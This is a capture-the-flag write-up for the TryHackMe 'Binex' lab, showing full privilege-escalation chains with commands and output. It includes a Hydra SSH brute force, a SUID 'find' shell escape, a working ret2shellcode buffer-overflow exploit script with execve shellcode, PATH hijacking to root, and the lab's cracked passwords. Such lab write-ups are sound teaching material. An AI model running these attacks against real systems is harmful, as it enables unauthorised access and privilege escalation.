# Binex — Full CTF Writeup
**Platform:** TryHackMe | **Category:** Binary Exploitation | **Difficulty:** Medium

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — SSH Brute Force](#2-initial-access)
3. [Privilege Escalation to `des` — SUID Abuse](#3-privilege-escalation-to-des)
4. [Privilege Escalation to `kel` — Buffer Overflow](#4-privilege-escalation-to-kel)
5. [Privilege Escalation to `root` — PATH Hijacking](#5-privilege-escalation-to-root)
6. [Flags Summary](#6-flags-summary)

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,139,445 $TARGET -oN service
```

**Output:**
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu
139/tcp open  netbios-ssn Samba 4.7.6
445/tcp open  netbios-ssn Samba 4.7.6
```

### SMB Enumeration

```bash
smbmap -u '' -p '' -H $TARGET
```

No readable shares, but SMB is running — try user enumeration.

### User Enumeration via RID Brute Force

```bash
enum4linux -r $TARGET
```

**Users discovered:**
```
kel
des
tryhackme
noentry
```

---

## 2. Initial Access

### SSH Brute Force with Hydra

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
```

**Credentials found:**
```
login: tryhackme
password: thebest
```

```bash
ssh tryhackme@$TARGET
```

---

## 3. Privilege Escalation to `des` — SUID Abuse

### Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Output:**
```
/usr/bin/find
/usr/bin/chfn
```

`/usr/bin/find` with SUID is a classic GTFOBins vector.

### Exploit `find` to Spawn a Shell as `des`

```bash
find . -exec /bin/sh -p \; -quit
```

The `-p` flag preserves the effective UID from the SUID bit.

```bash
whoami
# des
cat /home/des/flag.txt
# username: des
# password: destructive_72656275696c64
```

### SSH in as `des` for a Stable Shell

```bash
ssh des@$TARGET
# password: destructive_72656275696c64
```

---

## 4. Privilege Escalation to `kel` — 64-bit Buffer Overflow

### Vulnerable Binary

```bash
cat /home/kel/bof.c
```

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
    char buffer[600];       // Only 600 bytes allocated
    int characters_read;
    printf("Enter some string:\n");
    characters_read = read(0, buffer, 1000);  // BUG: reads up to 1000 bytes!
    printf("You entered: %s", buffer);
    return 0;
}

void main(){
    setresuid(geteuid(), geteuid(), geteuid());
    setresgid(getegid(), getegid(), getegid());
    foo();
}
```

**Why it is vulnerable:** `buffer` holds 600 bytes, but `read()` will accept up to 1000.
The 400 extra bytes spill beyond the buffer onto the stack, overwriting the saved **RBP**
and then the saved **RIP** — giving us full control of the instruction pointer.

### Verify Exploit Conditions

```bash
sysctl kernel.randomize_va_space
# 0  →  ASLR disabled: stack addresses are fixed
checksec ./bof
# No canary, NX disabled (stack is executable), No PIE
```

All mitigations are off — ideal for a classic ret2shellcode attack.

---

### Step 1 — Find the Offset with a Cyclic Pattern

Generate a De Bruijn pattern long enough to overflow the buffer:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
```

Paste the output into the binary inside GDB and observe the crash:

```bash
gdb ./bof
run
# paste pattern here
```

```
Program received signal SIGSEGV, Segmentation fault.
(gdb) info registers rbp
rbp   0x4134754133754132
```

Calculate the exact offset from that RBP value:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 0x4134754133754132
# [*] Exact match at offset 608
```

**Offset to saved RBP = 608 bytes.**
**Offset to saved RIP = 608 + 8 = 616 bytes.**

---

### Step 2 — Confirm RIP Control

```bash
# Inside GDB:
run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
x/4xg $rsp
```

```
0x7fffffffe498: 0x4343434343434343   <-- C's at RSP = we control RIP ✅
```

---

### Step 3 — Find the Buffer Address

Set a breakpoint at the `ret` instruction of `foo` to inspect the live stack:

```bash
(gdb) disassemble foo
# ...
# 0x000055555555484e <+84>: retq
(gdb) break *0x000055555555484e
(gdb) run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
(gdb) print $rbp - 0x260
# $1 = (void *) 0x7fffffffe260
```

`0x260` = 608 in decimal — matches our offset exactly.
**Buffer starts at `0x7fffffffe260`** (confirmed outside GDB with a modified binary).

---

### Step 4 — Build the Exploit

**Payload layout:**

```
┌─────────────────────────────────────────────────────────────────────┐
│  NOP sled (200)  │  Shellcode (24)  │  Junk (384)  │ RBP │  RIP   │
│                  608 bytes (offset)                 │  8  │   8    │
└─────────────────────────────────────────────────────────────────────┘
                                                             ↑
                                              points into NOP sled
```

**exploit.py:**

```python
import struct

# -----------------------------------------------------------------------
# SHELLCODE — execve("/bin//sh", NULL, NULL) for x86-64 Linux
#
# Syscall 0x3b (59) = execve
# rdi = pointer to "/bin//sh"   (filename)
# rsi = NULL                    (argv)
# rdx = NULL                    (envp)
# -----------------------------------------------------------------------
shellcode = (
    b"\x50"             # push rax          — align stack
    b"\x48\x31\xd2"     # xor rdx, rdx      — envp = NULL
    b"\x48\x31\xf6"     # xor rsi, rsi      — argv = NULL
    b"\x48\xbb"         # mov rbx, ...      — load "/bin//sh" into rbx:
    b"\x2f\x62\x69\x6e" #   "/bin"
    b"\x2f\x2f\x73\x68" #   "//sh"
    b"\x53"             # push rbx          — push string onto stack
    b"\x54"             # push rsp          — push pointer to string
    b"\x5f"             # pop rdi           — rdi = pointer to "/bin//sh"
    b"\xb0\x3b"         # mov al, 0x3b      — syscall number = 59
    b"\x0f\x05"         # syscall           — execve("/bin//sh", NULL, NULL)
)

# -----------------------------------------------------------------------
# NOP SLED — 200 × 0x90
# CPU executes these as no-ops and slides into the shellcode.
# Gives a 200-byte landing window so imprecise addressing still works.
# -----------------------------------------------------------------------
nop_sled = b"\x90" * 200

offset   = 608
junk     = b"A" * (offset - len(nop_sled) - len(shellcode))  # fill to RBP
rbp_pad  = b"B" * 8                                           # overwrite saved RBP

# Point to the middle of the NOP sled (+100) for a reliable landing
ret_addr = struct.pack("<Q", 0x7fffffffe260 + 100)

payload  = nop_sled + shellcode + junk + rbp_pad + ret_addr

with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"NOP sled:  {len(nop_sled)} bytes")
print(f"Shellcode: {len(shellcode)} bytes")
print(f"Junk:      {len(junk)} bytes")
print(f"Total:     {len(payload)} bytes")
```

```bash
python3 exploit.py
(cat payload.bin; cat) | ./bof
```

The trailing `cat` keeps stdin open so commands typed after the overflow reach the shell.

**Output:**
```
Enter some string:
$ whoami
kel
$ cat /home/kel/flag.txt
THM{...}
# username: kel
# password: kelvin_74656d7065726174757265
```

---

## 5. Privilege Escalation to `root` — PATH Hijacking

### SSH in as `kel`

```bash
ssh kel@$TARGET
# password: kelvin_74656d7065726174757265
```

### Analyze the SUID Binary

```bash
cat /home/kel/exe.c
```

```c
#include <unistd.h>
void main()
{
    setuid(0);   // runs as root
    setgid(0);
    system("ps"); // called without an absolute path — vulnerable!
}
```

**Why it is vulnerable:**

`system("ps")` asks the shell to find `ps` by searching `$PATH` left to right.
Because the binary sets UID/GID to 0 **before** calling `system()`, whatever
program is found first in `$PATH` runs as **root**.
An attacker who controls `$PATH` can plant a fake `ps` anywhere and have it
executed with full root privileges.

```bash
./exe
#   PID TTY   TIME CMD
#  2135 pts/1 00:00:00 exe
#  2136 pts/1 00:00:00 sh
#  2137 pts/1 00:00:00 ps      ← real ps runs now, but we can hijack this
```

**The fix would be:**
```c
system("/bin/ps");  // absolute path — $PATH is irrelevant
```

---

### Exploit: PATH Hijacking

#### Step 1 — Create a malicious `ps` in `/tmp`

```bash
echo '/bin/bash' > /tmp/ps
chmod +x /tmp/ps
```

#### Step 2 — Prepend `/tmp` to `$PATH`

```bash
export PATH=/tmp:$PATH
echo $PATH
# /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:...
which ps
# /tmp/ps   ← shell now finds our fake ps first
```

#### Step 3 — Execute the SUID binary

```bash
./exe
```

**What happens internally:**
```
exe (setuid → root)
 └─ system("ps")
     └─ shell searches $PATH left to right
         └─ finds /tmp/ps first
             └─ executes /bin/bash  →  shell as root ✅
```

**Output:**
```bash
root@THM_exploit:~# whoami
root
root@THM_exploit:~# cat /root/root.txt
THM{...}
```

---

## 6. Flags Summary

| Step | User | Method | Flag Location |
|---|---|---|---|
| 1 | `tryhackme` | SSH brute force | — |
| 2 | `des` | SUID `find` abuse | `/home/des/flag.txt` |
| 3 | `kel` | 64-bit buffer overflow (ret2shellcode) | `/home/kel/flag.txt` |
| 4 | `root` | PATH hijacking via SUID binary | `/root/root.txt` |

---

## Key Concepts Covered

| Concept | Description |
|---|---|
| **Buffer Overflow** | Writing beyond a fixed-size buffer to overwrite the return address |
| **NOP Sled** | A sequence of `\x90` instructions that slide execution into shellcode |
| **ret2shellcode** | Redirecting RIP to attacker-controlled shellcode on the stack |
| **SUID Abuse** | Exploiting binaries that run with elevated privileges |
| **PATH Hijacking** | Planting a malicious binary earlier in `$PATH` than the real one |
| **Mitigations bypassed** | No ASLR, no NX, no stack canary, no PIE |
## Related Notes

- [nmap.md](../../../tools/recon/nmap.md)
- [smbmap.md](../../../tools/recon/smbmap.md)
- [enum4linux.md](../../../tools/recon/enum4linux.md)
- [hydra.md](../../../tools/creds/hydra.md)
- [suid-find-escape.md](../../../privesc/linux/suid-find-escape.md)
- [buffer-overflow-ret2shellcode.md](../../../techniques/reversing/buffer-overflow-ret2shellcode.md)
- [suid-path-hijack.md](../../../privesc/linux/suid-path-hijack.md)
